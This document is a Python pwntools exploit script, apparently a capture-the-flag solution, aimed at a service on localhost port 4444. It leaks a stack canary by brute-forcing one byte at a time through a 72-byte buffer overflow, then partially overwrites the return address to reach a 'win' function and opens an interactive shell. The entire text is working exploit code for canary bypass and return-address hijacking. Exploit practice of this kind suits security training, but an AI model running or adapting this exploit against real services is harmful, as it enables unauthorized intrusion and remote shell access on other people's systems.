#!/usr/bin/python3
import pwn  # import pwntools
pwn.context.log_level = 'CRITICAL'
canary = b""


def leak_canary(canary):
    for i in range(8):  # loop 8 times for 8 bytes of a canary
        for j in range(256):  # loop 256 times for all possible values of a byte
            # create a connection to localhost:4444
            io = pwn.remote("127.0.0.1", 4444)
            # buf is at rbp-0x50 and canary is at rbp-0x8
            # so we write 72 bytes of garbage + 8 byte canary
            io.recv()
            payload1 = b"80"
            # send size
            io.sendline(payload1)
            io.recv()
            # send payload
            payload2 = b"A"*72
            payload2 += canary
            payload2 += pwn.p8(j)
            io.send(payload2)
            mssg = io.clean()
            # check if canary corrupted
            if b"stack" not in mssg:
                # Append byte found to canary
                canary += pwn.p8(j)
                print(f"[+] Canary - {hex(pwn.unpack(canary,'all'))}")
                io.close()
                break
            io.close()
    return canary


canary = pwn.u64(leak_canary(canary))
print("[!] Canary Leaked - ", hex(canary))
rbp = b"A"*8
canary = pwn.p64(canary)


def brute_win_func(rbp, canary):
    for i in range(16):
        print(f"Trying {i}")
        io = pwn.remote("127.0.0.1", 4444)
        io.recv()
        payload1 = b"90"
        # send size
        io.sendline(payload1)
        io.recv()
        # 00000000000013c9 <win>:
        ret_addr = pwn.p8(0xc9)  # the fixed byte
        # the byte whose nibble we have to bruteforce
        ret_addr += pwn.p8(i*16+0x3)
        payload2 = b"A"*72
        payload2 += canary
        payload2 += rbp
        payload2 += ret_addr
        io.send(payload2)
        # echo command to check if we have shell
        command = b"echo hello\n"
        io.sendline(command)
        mssg = io.clean()
        if b"hello" in mssg:
            # drop into interactive shell session
            io.interactive()
        io.close()


brute_win_func(rbp, canary)
